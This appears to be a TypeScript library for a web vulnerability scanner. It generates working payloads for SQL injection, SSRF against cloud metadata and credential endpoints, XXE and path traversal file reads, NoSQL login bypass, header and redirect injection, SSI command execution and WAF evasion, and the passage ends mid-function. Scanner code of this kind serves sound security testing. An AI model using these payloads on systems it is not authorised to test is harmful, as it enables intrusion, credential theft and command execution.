import * as https from 'https';
import * as http from 'http';
import * as crypto from 'crypto';

// ─── Out-of-Band (OOB) Interaction Detection ───
// Generates unique markers for blind vulnerability detection via DNS/HTTP callbacks

export function generateOOBMarker(prefix: string = 'cg'): string {
  return `${prefix}-${crypto.randomBytes(8).toString('hex')}`;
}

export interface OOBResult {
  marker: string;
  checkDNS: (observed: string[]) => boolean;
  checkHTTP: (requests: { path: string; headers: Record<string, string> }[]) => boolean;
}

/**
 * Create an OOB marker and return verification functions.
 * In production, you'd run a DNS/HTTP listener; here we return the marker
 * and check functions that can be evaluated against observed interactions.
 */
export function createOOBTest(prefix: string = 'cg'): OOBResult {
  const marker = generateOOBMarker(prefix);
  return {
    marker,
    checkDNS: (observed: string[]) => observed.some(o => o.includes(marker)),
    checkHTTP: (requests: { path: string; headers: Record<string, string> }[]) =>
      requests.some(r => r.path.includes(marker) || JSON.stringify(r.headers).includes(marker)),
  };
}

// ─── Timing Analysis ───
// Measures response time deltas to detect blind injection

export interface TimingResult {
  baseline: number;
  tests: { label: string; duration: number; payload: string }[];
  isBlind: (thresholdMs?: number) => boolean;
  confidence: 'none' | 'low' | 'medium' | 'high';
}

/**
 * Measure response timing to detect blind SQLi/SSRF/time-based injection.
 * Runs baseline first, then tests with payloads expected to cause delays.
 */
export async function measureTiming(
  requestFn: (payload: string) => Promise<number>,
  baselinePayloads: string[],
  attackPayloads: { label: string; payload: string; expectedDelayMs: number }[],
  options: { threshold?: number; confidenceThreshold?: number } = {}
): Promise<TimingResult> {
  const threshold = options.threshold || 2000;
  const confidenceThreshold = options.confidenceThreshold || 2;

  // Measure baseline
  const baselineTimes: number[] = [];
  for (const p of baselinePayloads) {
    try {
      const start = Date.now();
      await requestFn(p);
      baselineTimes.push(Date.now() - start);
    } catch {}
  }
  const baseline = baselineTimes.length > 0 ? baselineTimes.reduce((a, b) => a + b, 0) / baselineTimes.length : 0;

  // Measure attack payloads
  const tests: { label: string; duration: number; payload: string }[] = [];
  let blindCount = 0;

  for (const { label, payload, expectedDelayMs } of attackPayloads) {
    try {
      const start = Date.now();
      await requestFn(payload);
      const duration = Date.now() - start;
      tests.push({ label, duration, payload });
      if (duration - baseline > expectedDelayMs * 0.7) blindCount++;
    } catch {
      tests.push({ label, duration: 0, payload });
    }
  }

  const confidence = blindCount >= confidenceThreshold ? 'high' :
    blindCount >= 1 ? 'medium' :
    tests.some(t => t.duration - baseline > threshold * 0.5) ? 'low' : 'none';

  return {
    baseline,
    tests,
    isBlind: (thresh = threshold) => blindCount >= 1 && tests.some(t => t.duration - baseline > thresh),
    confidence,
  };
}

// ─── Encoding Bypasses ───
// Common encoding techniques to bypass WAFs and input filters

export const EncodingBypasses = {
  /** Double URL encode: %2527 for single quote */
  doubleUrlEncode: (s: string) => encodeURIComponent(encodeURIComponent(s)),

  /** Unicode escape: \\u0027 for single quote */
  unicodeEscape: (s: string) => s.replace(/['"]/g, c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`),

  /** Null byte injection: %00 suffix */
  nullByte: (s: string) => s + '%00',

  /** Mixed case bypass: SeLeCt for SELECT */
  mixedCase: (s: string) => {
    const result: string[] = [];
    for (let i = 0; i < s.length; i++) {
      result.push(i % 2 === 0 ? s[i].toUpperCase() : s[i].toLowerCase());
    }
    return result.join('');
  },

  /** HTML entity encode: &#39; for single quote */
  htmlEntity: (s: string) => s.replace(/['"<>&]/g, c => {
    const map: Record<string, string> = { "'": '&#39;', '"': '&quot;', '<': '&lt;', '>': '&gt;', '&': '&amp;' };
    return map[c] || c;
  }),

  /** Tab/newline bypass: SELECT\\tFROM */
  whitespaceBypass: (s: string) => s.replace(/\s+/g, m => {
    const variants = ['\t', '\n', '\r\n', '/**/', '+'];
    return variants[Math.floor(Math.random() * variants.length)];
  }),

  /** Chunked transfer encoding bypass */
  chunkedBypass: (s: string) => {
    const parts: string[] = [];
    for (let i = 0; i < s.length; i += 2) {
      const chunk = s.substring(i, Math.min(i + 2, s.length));
      parts.push(chunk.length.toString(16));
      parts.push(chunk);
    }
    parts.push('0');
    return parts.join('\r\n') + '\r\n\r\n';
  },

  /** Base64 inline: ' || base64_decode('dGVzdA==') || ' */
  base64Inline: (s: string) => `' || '${Buffer.from(s).toString('base64')}'::bytea::text || '`,
};

// ─── Response Analysis ───

export interface ResponsePattern {
  statusCode?: number[];
  bodyContains?: string[];
  bodyNotContains?: string[];
  headerContains?: Record<string, string>;
  headerNotContains?: string[];
}

/**
 * Analyze HTTP response against expected patterns for a given attack type.
 */
export function analyzeResponse(
  statusCode: number,
  body: string,
  headers: Record<string, string | string[] | undefined>,
  patterns: ResponsePattern
): { matched: boolean; details: string[] } {
  const details: string[] = [];
  let matched = true;

  if (patterns.statusCode && !patterns.statusCode.includes(statusCode)) {
    matched = false;
    details.push(`Expected status ${patterns.statusCode.join('|')}, got ${statusCode}`);
  }

  if (patterns.bodyContains) {
    const bodyLower = body.toLowerCase();
    const found = patterns.bodyContains.some(p => bodyLower.includes(p.toLowerCase()));
    if (!found) {
      matched = false;
      details.push(`Body missing expected patterns: ${patterns.bodyContains.join(', ')}`);
    } else {
      details.push(`Body matches: ${patterns.bodyContains.find(p => bodyLower.includes(p.toLowerCase()))}`);
    }
  }

  if (patterns.bodyNotContains) {
    const bodyLower = body.toLowerCase();
    const found = patterns.bodyNotContains.some(p => bodyLower.includes(p.toLowerCase()));
    if (found) {
      matched = false;
      details.push(`Body unexpectedly contains: ${patterns.bodyNotContains.find(p => bodyLower.includes(p.toLowerCase()))}`);
    }
  }

  if (patterns.headerContains) {
    for (const [key, value] of Object.entries(patterns.headerContains)) {
      const headerValue = headers[key];
      if (!headerValue || (Array.isArray(headerValue) ? headerValue.join(' ') : headerValue).toLowerCase().includes(value.toLowerCase())) {
        // Intentionally no-op — header pattern matched
      } else {
        matched = false;
        details.push(`Header ${key} missing expected value: ${value}`);
      }
    }
  }

  return { matched, details };
}

// ─── Payload Generators ───

export function generateTimeBasedSQLiPayloads(delaySec: number = 5): { payload: string; indicator: string; label: string }[] {
  const d = delaySec;
  return [
    { payload: `1' WAITFOR DELAY '0:0:${d}'--`, indicator: 'waitfor|timeout|delay', label: `MSSQL WAITFOR ${d}s` },
    { payload: `1' AND SLEEP(${d})--`, indicator: 'sleep|timeout|delay', label: `MySQL SLEEP ${d}s` },
    { payload: `1'; SELECT pg_sleep(${d});--`, indicator: 'sleep|timeout|delay', label: `PostgreSQL pg_sleep ${d}s` },
    { payload: `1' AND (SELECT * FROM (SELECT(SLEEP(${d})))a)--`, indicator: 'sleep|timeout', label: `MySQL subquery SLEEP ${d}s` },
    { payload: `1'; WAITFOR DELAY '0:0:${d}' AND '1'='1`, indicator: 'waitfor|timeout', label: `MSSQL conditional WAITFOR ${d}s` },
    { payload: `1' OR IF(1=1,SLEEP(${d}),0)--`, indicator: 'sleep|timeout', label: `MySQL conditional SLEEP ${d}s` },
    { payload: `1' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(${d}) ELSE pg_sleep(0) END)--`, indicator: 'sleep|timeout', label: `PostgreSQL conditional pg_sleep ${d}s` },
    { payload: `1'; DECLARE @d VARCHAR(10) SET @d='0:0:${d}'; WAITFOR DELAY @d;--`, indicator: 'waitfor|timeout', label: `MSSQL variable WAITFOR ${d}s` },
    { payload: `1' OR (SELECT SLEEP(${d}) FROM DUAL WHERE 1=1)--`, indicator: 'sleep|timeout', label: `MySQL DUAL SLEEP ${d}s` },
  ];
}

export function generateErrorBasedSQLiPayloads(): { payload: string; indicator: string; label: string }[] {
  return [
    { payload: "'", indicator: "syntax error|mysql|sqlite|postgresql|oracle|mssql|odbc|unclosed quotation|unterminated", label: "Basic quote" },
    { payload: "1' OR '1'='1", indicator: "syntax error|mysql|sqlite|postgresql|oracle|column", label: "OR bypass" },
    { payload: "1' UNION SELECT NULL--", indicator: "column|syntax error|mysql|sqlite|select", label: "UNION NULL" },
    { payload: "1' AND 1=CONVERT(int,(SELECT @@version))--", indicator: "conversion|syntax error|mysql|mssql", label: "CONVERT version" },
    { payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", indicator: "duplicate|entry|floor|rand|version", label: "GROUP BY error" },
    { payload: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", indicator: "xpath|syntax error|XPATH", label: "EXTRACTVALUE" },
    { payload: "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", indicator: "xpath|syntax error|XPATH", label: "UPDATEXML" },
    { payload: "1' AND (SELECT 1 FROM dual WHERE 1=1 UNION SELECT 1 FROM dual WHERE 1=0)--", indicator: "dual|syntax error|unknown", label: "UNION dual" },
    { payload: "' OR ''='", indicator: "syntax error|mysql|sqlite|postgresql|oracle", label: "Empty OR" },
    { payload: "' OR 1=1 LIMIT 1--", indicator: "syntax error|mysql|sqlite|column|limit", label: "OR LIMIT" },
    { payload: "' OR 1=1 INTO OUTFILE '/tmp/test'--", indicator: "outfile|privilege|directory|permission|denied", label: "INTO OUTFILE" },
    { payload: "'; SELECT 1;--", indicator: "syntax error|mysql|sqlite|postgresql|unterminated", label: "Stacked query" },
    { payload: "1' UNION SELECT table_name FROM information_schema.tables--", indicator: "table_name|information_schema|syntax error", label: "Schema leak" },
    { payload: "1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a)--", indicator: "duplicate|count|syntax error", label: "Triple UNION" },
  ];
}

export function generateSSRFPayloads(): { url: string; indicator: string; type: string; severity: string }[] {
  return [
    // Cloud metadata
    { url: 'http://169.254.169.254/latest/meta-data/', indicator: 'ami-id|instance-id|meta-data|hostname', type: 'aws-metadata', severity: 'critical' },
    { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', indicator: 'AccessKeyId|SecretAccessKey|Token', type: 'aws-iam', severity: 'critical' },
    { url: 'http://169.254.169.254/latest/user-data/', indicator: '', type: 'aws-userdata', severity: 'high' },
    { url: 'http://metadata.google.internal/computeMetadata/v1/', indicator: 'computeMetadata|instance|project', type: 'gcp-metadata', severity: 'critical' },
    { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', indicator: 'compute|network|storage|osType', type: 'azure-metadata', severity: 'critical' },
    { url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', indicator: 'access_token|token_type', type: 'azure-token', severity: 'critical' },
    // Internal services
    { url: 'http://localhost:22', indicator: 'SSH|OpenSSH|Protocol', type: 'ssh-internal', severity: 'high' },
    { url: 'http://127.0.0.1:6379', indicator: 'PING|PONG|redis|connected|ERR', type: 'redis-internal', severity: 'critical' },
    { url: 'http://localhost:3306', indicator: 'mysql|MariaDB|version', type: 'mysql-internal', severity: 'critical' },
    { url: 'http://localhost:5432', indicator: 'postgresql|FATAL|SSL|protocol', type: 'postgres-internal', severity: 'critical' },
    { url: 'http://localhost:27017', indicator: 'MongoDB|ismaster|ok', type: 'mongodb-internal', severity: 'critical' },
    { url: 'http://localhost:9200', indicator: 'cluster_name|version|tagline', type: 'elasticsearch-internal', severity: 'critical' },
    { url: 'http://localhost:8080', indicator: '', type: 'internal-8080', severity: 'medium' },
    { url: 'http://localhost:9090', indicator: '', type: 'internal-9090', severity: 'medium' },
    { url: 'http://127.0.0.1:443', indicator: '', type: 'internal-https', severity: 'medium' },
    // IPv6 bypass
    { url: 'http://[::1]:22', indicator: 'SSH|OpenSSH|Protocol', type: 'ipv6-loopback-ssh', severity: 'high' },
    { url: 'http://[::1]:6379', indicator: 'PONG|redis|ERR', type: 'ipv6-loopback-redis', severity: 'critical' },
    { url: 'http://[0:0:0:0:0:0:0:1]:22', indicator: 'SSH|OpenSSH|Protocol', type: 'ipv6-full-loopback-ssh', severity: 'high' },
    // Decimal/hex IP bypass
    { url: 'http://2130706433/', indicator: 'localhost', type: 'decimal-ip', severity: 'high' },
    { url: 'http://0x7f000001/', indicator: 'localhost', type: 'hex-ip', severity: 'high' },
    { url: 'http://0177.0.0.1/', indicator: 'localhost', type: 'octal-ip', severity: 'high' },
    // URL parser quirks
    { url: 'http://127.1:6379', indicator: 'PONG|redis|ERR', type: 'short-ip', severity: 'critical' },
    { url: 'http://0.0.0.0:6379', indicator: 'PONG|redis|ERR', type: 'zero-ip', severity: 'critical' },
    // Protocol smuggling
    { url: 'gopher://localhost:6379/_PING%0D%0A', indicator: 'PONG', type: 'gopher-redis', severity: 'critical' },
    { url: 'dict://localhost:6379/info', indicator: 'redis_version|connected_clients', type: 'dict-redis', severity: 'critical' },
    { url: 'file:///etc/passwd', indicator: 'root:|/bin/bash|/bin/sh', type: 'file-protocol', severity: 'critical' },
  ];
}

export function generateXXEPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    // Basic XXE
    { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', indicator: 'root:|/bin/bash|/bin/sh', type: 'basic-file-read' },
    { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>', indicator: '', type: 'hostname' },
    // Blind XXE via error
    { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent987654321">]><root>&xxe;</root>', indicator: 'No such file|Entity.*not defined|failed to load', type: 'blind-file-error' },
    // SSRF via XXE
    { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', indicator: 'ami-id|instance-id|meta-data', type: 'ssrf-xxe' },
    // Parameter entity (external DTD)
    { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://127.0.0.1:9999/test.dtd">%dtd;]><root>test</root>', indicator: '', type: 'parameter-entity' },
    // Internal parameter entity
    { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &amp;#x25; exfil SYSTEM &amp;#x25;file;">">%eval;%exfil;]><root>&exfil;</root>', indicator: 'root:|/bin/bash', type: 'internal-parameter' },
    // SVG XXE
    { payload: '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>', indicator: 'root:|/bin/bash', type: 'svg-xxe' },
    // SOAP XXE
    { payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>', indicator: 'root:|/bin/bash', type: 'soap-xxe' },
    // XInclude attack
    { payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', indicator: 'root:|/bin/bash', type: 'xinclude' },
    // UTF-8 BOM bypass
    { payload: '\xEF\xBB\xBF<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', indicator: 'root:|/bin/bash', type: 'utf8-bom' },
    // Encoding bypass
    { payload: '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', indicator: 'root:|/bin/bash', type: 'encoding-bypass' },
    // Billion laughs (DoS indicator)
    { payload: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><root>&lol4;</root>', indicator: '', type: 'billion-laughs-dos' },
  ];
}

export function generateNoSQLPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    // Operator injection
    { payload: '{"username": {"$ne": ""}, "password": {"$ne": ""}}', indicator: 'welcome|dashboard|token|success|200', type: 'operator-ne' },
    { payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}', indicator: 'welcome|dashboard|token|success|200', type: 'operator-gt' },
    { payload: '{"username": {"$gte": ""}, "password": {"$gte": ""}}', indicator: 'welcome|dashboard|token|success|200', type: 'operator-gte' },
    { payload: '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}', indicator: 'welcome|dashboard|token|success|200', type: 'regex-injection' },
    { payload: '{"username": {"$exists": true}, "password": {"$exists": true}}', indicator: 'welcome|dashboard|token|success|200', type: 'exists-injection' },
    // Where injection
    { payload: '{"$where": "this.password.length > 0"}', indicator: 'welcome|dashboard|token|success|200', type: 'where-injection' },
    { payload: '{"$where": "function(){return true}"}', indicator: 'welcome|dashboard|token|success|200', type: 'where-function' },
    // Time-based blind
    { payload: '{"username": "admin", "password": {"$gt": ""}, "$where": "function(){var start = new Date(); while((new Date() - start) < 5000); return true;}"}', indicator: 'timeout|5000|delay', type: 'time-based-blind' },
    // Array injection
    { payload: '{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$in": ["", "password", "admin"]}}', indicator: 'welcome|dashboard|token|success|200', type: 'array-injection' },
    // $expr injection
    { payload: '{"$expr": {"$eq": ["$username", "$password"]}}', indicator: 'welcome|dashboard|token|success|200', type: 'expr-injection' },
    // Parameter injection via query string
    { payload: 'username[$ne]=admin&password[$ne]=pass', indicator: 'welcome|dashboard|token|success|200', type: 'qs-operator' },
    { payload: 'username[$gt]=a&password[$gt]=a', indicator: 'welcome|dashboard|token|success|200', type: 'qs-gt' },
    // BSON type confusion
    { payload: '{"username": {"$type": "string"}, "password": {"$type": "string"}}', indicator: 'welcome|dashboard|token|success|200', type: 'type-confusion' },
  ];
}

export function generateHeaderInjectionPayloads(): { payload: string; type: string; indicator: string }[] {
  return [
    { payload: 'test\r\nX-Injected-Header: true', type: 'crlf', indicator: 'x-injected-header' },
    { payload: 'test%0d%0aX-Injected-Header:%20true', type: 'url-crlf', indicator: 'x-injected-header' },
    { payload: 'test\r\n\r\n<script>alert(1)</script>', type: 'crlf-xss', indicator: '<script>' },
    { payload: 'test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>', type: 'url-crlf-xss', indicator: '<script>' },
    { payload: 'test%0d%0aSet-Cookie:%20session=evil', type: 'cookie-injection', indicator: 'set-cookie' },
    { payload: 'test\r\nLocation: http://evil.com', type: 'header-redirect', indicator: 'location' },
  ];
}

export function generateRedirectPayloads(): { url: string; indicator: string; type: string }[] {
  return [
    { url: '//evil.com', indicator: 'location:.*//evil\\.com', type: 'protocol-relative' },
    { url: 'https://evil.com', indicator: 'location:.*evil\\.com', type: 'absolute-https' },
    { url: 'http://evil.com', indicator: 'location:.*evil\\.com', type: 'absolute-http' },
    { url: '/\\evil.com', indicator: 'location:.*evil\\.com', type: 'backslash' },
    { url: '//evil%2Ecom', indicator: 'location:.*evil', type: 'encoded-dot' },
    { url: 'javascript:alert(1)', indicator: 'location:.*javascript:', type: 'javascript' },
    { url: 'data:text/html,<script>alert(1)</script>', indicator: 'location:.*data:', type: 'data-uri' },
    { url: '////evil.com', indicator: 'location:.*evil\\.com', type: 'four-slashes' },
    { url: '/\\evil.com', indicator: 'location:.*evil\\.com', type: 'backslash-path' },
    { url: '/evil.com', indicator: 'location:.*evil\\.com', type: 'relative-path' },
    { url: '//evil.com@trusted.com', indicator: 'location:.*evil\\.com', type: 'userinfo' },
    { url: '//trusted.com%2523@evil.com', indicator: 'location:.*evil\\.com', type: 'fragment-bypass' },
    { url: '//evil%0d%0acom', indicator: 'location:.*evil', type: 'crlf-redirect' },
  ];
}

export function generatePathTraversalPayloads(): { path: string; indicator: string; type: string }[] {
  return [
    { path: '../../../etc/passwd', indicator: 'root:|/bin/bash|/bin/sh', type: 'unix-basic' },
    { path: '..\\..\\..\\windows\\system32\\config\\sam', indicator: '\\[', type: 'windows-basic' },
    { path: '....//....//....//etc/passwd', indicator: 'root:|/bin/bash', type: 'double-encoding' },
    { path: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd', indicator: 'root:|/bin/bash', type: 'url-encoded' },
    { path: '..%252f..%252f..%252fetc/passwd', indicator: 'root:|/bin/bash', type: 'double-url-encoded' },
    { path: '..%c0%af..%c0%af..%c0%afetc/passwd', indicator: 'root:|/bin/bash', type: 'utf8-overlong' },
    { path: '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd', indicator: 'root:|/bin/bash', type: 'unicode-slash' },
    { path: '....\\\\....\\\\....\\\\etc/passwd', indicator: 'root:|/bin/bash', type: 'double-backslash' },
    { path: '/etc/passwd%00', indicator: 'root:|/bin/bash', type: 'null-byte' },
    { path: '..\\..\\..\\etc\\passwd', indicator: 'root:|/bin/bash', type: 'backslash-unix' },
    { path: '....//....//....//....//etc/passwd', indicator: 'root:|/bin/bash', type: 'quadruple-encode' },
    { path: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', indicator: 'root:|/bin/bash', type: 'triple-url-encode' },
  ];
}

export function generateHostHeaderPayloads(): { header: Record<string, string>; indicator: string; type: string }[] {
  return [
    { header: { 'Host': 'evil.com' }, indicator: 'evil.com', type: 'host-override' },
    { header: { 'X-Forwarded-Host': 'evil.com' }, indicator: 'evil.com', type: 'x-forwarded-host' },
    { header: { 'X-Original-URL': '//evil.com' }, indicator: 'evil.com', type: 'x-original-url' },
    { header: { 'X-Rewrite-URL': '//evil.com' }, indicator: 'evil.com', type: 'x-rewrite-url' },
    { header: { 'X-Host': 'evil.com' }, indicator: 'evil.com', type: 'x-host' },
    { header: { 'X-Forwarded-For': '127.0.0.1' }, indicator: '', type: 'x-forwarded-for' },
    { header: { 'Host': 'evil.com:443' }, indicator: 'evil.com', type: 'host-port' },
    { header: { 'Host': 'evil.com%0d%0aX-Injected: true' }, indicator: 'x-injected', type: 'host-crlf' },
  ];
}

export function generateSSIPayloads(): { payload: string; indicator: string; type: string }[] {
  return [
    { payload: '<!--#exec cmd="id"-->', indicator: 'uid=|gid=', type: 'command-execution' },
    { payload: '<!--#exec cmd="cat /etc/passwd"-->', indicator: 'root:|/bin/bash', type: 'file-read' },
    { payload: '<!--#include virtual="/etc/passwd"-->', indicator: 'root:|/bin/bash', type: 'file-include' },
    { payload: '<!--#echo var="DOCUMENT_ROOT"-->', indicator: '/var/www|/home|/usr/share|apache|nginx', type: 'document-root' },
    { payload: '<!--#config timefmt="%H:%M:%S"-->', indicator: '[0-9]{2}:[0-9]{2}:[0-9]{2}', type: 'time-format' },
    { payload: '<!--#config sizefmt="bytes"-->', indicator: '', type: 'size-format' },
    { payload: '<!--#fsize file="/etc/passwd"-->', indicator: '', type: 'file-size' },
    { payload: '<!--#printenv-->', indicator: 'HOME=|PATH=|SERVER_NAME=', type: 'print-env' },
    { payload: '<!--#exec cmd="ls /etc"-->', indicator: 'passwd|shadow|hosts', type: 'list-dir' },
    { payload: '<!--#exec cmd="whoami"-->', indicator: '', type: 'whoami' },
  ];
}

export function generateGraphQLPayloads(): { query: string; indicator: string; type: string }[] {
  return [
    // Introspection
    { query: '{"query":"{ __schema { types { name fields { name } } } }"}', indicator: '__schema|types|fields', type: 'introspection' },
    { query: '{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}', indicator: '__type|name|fields', type: 'type-introspection' },
    // Batching attack
    { query: '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]', indicator: '__typename', type: 'batching-10' },
    // Depth limit bypass via fragments
    { query: '{"query":"query { a: __typename ...on Query { b: __typename ...on Query { c: __typename ...on Query { d: __typename } } } }"}', indicator: '__typename', type: 'depth-fragment' },
    // Alias overflow
    { query: '{"query":"{ a1: __typename a2: __typename a3: __typename a4: __typename a5: __typename a6: __typename a7: __typename a8: __typename a9: __typename a10: __typename a11: __typename a12: __typename a13: __typename a14: __typename a15: __typename }"}', indicator: '__typename', type: 'alias-overflow' },
    // Field duplication
    { query: '{"query":"{ __typename __typename __typename __typename __typename __typename __typename __typename __typename __typename }"}', indicator: '__typename', type: 'field-duplication' },
    // Error-based information disclosure
    { query: '{"query":"{ user(id: \"test\") { nonExistentField } }"}', indicator: 'Cannot query|does not exist|unknown field|suggestion', type: 'error-disclosure' },
    // Mutation enumeration
    { query: '{"query":"{ __schema { mutationType { fields { name } } } }"}', indicator: 'mutation|fields|name', type: 'mutation-introspection' },
    // Subscription enumeration
    { query: '{"query":"{ __schema { subscriptionType { fields { name } } } }"}', indicator: 'subscription|fields|name', type: 'subscription-introspection' },
    // Directive enumeration
    { query: '{"query":"{ __schema { directives { name locations args { name } } } }"}', indicator: 'directives|include|skip', type: 'directive-introspection' },
    // Persisted query bypass (query backed with a non-existent ID, then full query passthrough)
    { query: '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"fefb56c2824c4460f2c0b4c2e45a229090b0a0d505bfdc9e04e6a4d43197f1c5"}},"query":"{ __typename }"}', indicator: '__typename|PersistedQueryNotFound', type: 'persisted-query' },
    // GraphQL variable injection
    { query: '{"query":"query ($id: ID!) { user(id: $id) { id name } }","variables":{"id":"1"}}', indicator: 'user|name|id', type: 'variable-injection' },
  ];
}

// ─── BASELINE DIFFERENCING HELPERS (manual-pentest verification) ────────────
// A real pentester sends a benign value, records the "normal" response, then
// sends an attack payload and verifies the response DEVIATES — reducing the
// false positives that plague naive signature matching.

export interface BaselineInfo {
  status: number;
  bodyHash: string;
  bodyLength: number;
  hasBody: boolean;
  loadMs: number;
  headers: Record<string, string>;
}

export function hashResponseBody(body: string): string {
  return crypto.createHash('sha1').update(body.replace(/\s+/g, ' ').trim().toLowerCase()).digest('hex').slice(0, 16);
}

/**
 * Does an attack response deviate meaningfully from baseline?
 * Tolerates dynamic tokens/timestamps via percentage-length delta,
 * falls back to strict hash comparison when both bodies are non-trivial.
 */
export function responseDiffers(
  attack: { statusCode: number; body: string; loadMs?: number },
  baseline?: BaselineInfo,
  opts: { requireStatusChange?: boolean; bodyStrict?: boolean } = {}
): boolean {
  if (!baseline) return attack.statusCode >= 400;
  if (!opts.requireStatusChange && attack.statusCode !== baseline.status) return true;
  const delta = Math.abs(attack.body.length - baseline.bodyLength);
  const pct = baseline.bodyLength > 0 ? delta / baseline.bodyLength : (delta > 100 ? 1 : 0);
  if (pct > 0.3) return true;
  if (opts.bodyStrict && baseline.bodyLength > 200 && attack.body.length > 200) {
    return hashResponseBody(attack.body) !== baseline.bodyHash;
  }
  return false;
}

/** Blind boolean oracle: does sending true vs false SQL conditions produce different responses? */
export interface BooleanOracle {
  baseline: BaselineInfo | undefined;
  trueResponse: { statusCode: number; body: string; loadMs: number };
  falseResponse: { statusCode: number; body: string; loadMs: number };
  isBlind: (threshold?: number) => boolean;
  confidence: 'none' | 'low' | 'medium' | 'high';
}

export async function measureBooleanOracle(
  requestFn: (payload: string) => Promise<{ statusCode: number; body: string; loadMs: number }>,
  benignPayloads: string[],
  ok: { label: string; payload: string },
  bad: { label: string; payload: string },
  options: { threshold?: number } = {}
): Promise<BooleanOracle> {
  const threshold = options.threshold || 0.3;
  const baselineTimes: { statusCode: number; body: string; loadMs: number }[] = [];
  for (const p of benignPayloads) {
    try { baselineTimes.push(await requestFn(p)); } catch {}
  }
  const base = baselineTimes.length > 0 ? baselineTimes[0] : { statusCode: 0, body: '', loadMs: 0 };
  let trueRes: { statusCode: number; body: string; loadMs: number } = { statusCode: 0, body: '', loadMs: 0 };
  let falseRes: { statusCode: number; body: string; loadMs: number } = { statusCode: 0, body: '', loadMs: 0 };
  let trueOk = false;
  let falseOk = false;
  try { trueRes = await requestFn(ok.payload); trueOk = true; } catch {}
  try { falseRes = await requestFn(bad.payload); falseOk = true; } catch {}

  const baselineInfo: BaselineInfo | undefined = {
    status: base.statusCode,
    bodyHash: hashResponseBody(base.body),
    bodyLength: base.body.length,
    hasBody: (base.body || '').trim().length > 0,
    loadMs: base.loadMs,
    headers: {},
  };

  const statusOk = trueOk && falseOk && trueRes.statusCode === base.statusCode;
  const trueDiff = responseDiffers(trueRes, baselineInfo, { requireStatusChange: true });
  const trueBodyDiff = hashResponseBody(trueRes.body) !== baselineInfo.bodyHash;
  const falseSame = !responseDiffers(falseRes, baselineInfo, { requireStatusChange: true }) || hashResponseBody(falseRes.body) === baselineInfo.bodyHash;

  let confidence: 'none' | 'low' | 'medium' | 'high' = 'none';
  let isBlind = false;
  if (statusOk && trueDiff && falseSame) { isBlind = true; confidence = 'high'; }
  else if (statusOk && trueBodyDiff && falseSame) { isBlind = true; confidence = 'medium'; }
  else if (statusOk && trueDiff) { isBlind = true; confidence = 'low'; }

  void threshold;
  return {
    baseline: baselineInfo,
    trueResponse: trueRes,
    falseResponse: falseRes,
    isBlind: () => isBlind,
    confidence,
  };
}

// ─── WAF-AWARE PAYLOAD VARIANTS ─────────────────────────────────────────────
// Manual pentesters adapt payloads once a WAF is detected. These helper
// generators produce obfuscated variants of core payloads.

export function wafBypassVariants(payload: string): string[] {
  const variants = [payload];
  // Double URL encode
  variants.push(encodeURIComponent(payload));
  // Mixed case SQL keywords (SeLeCt)
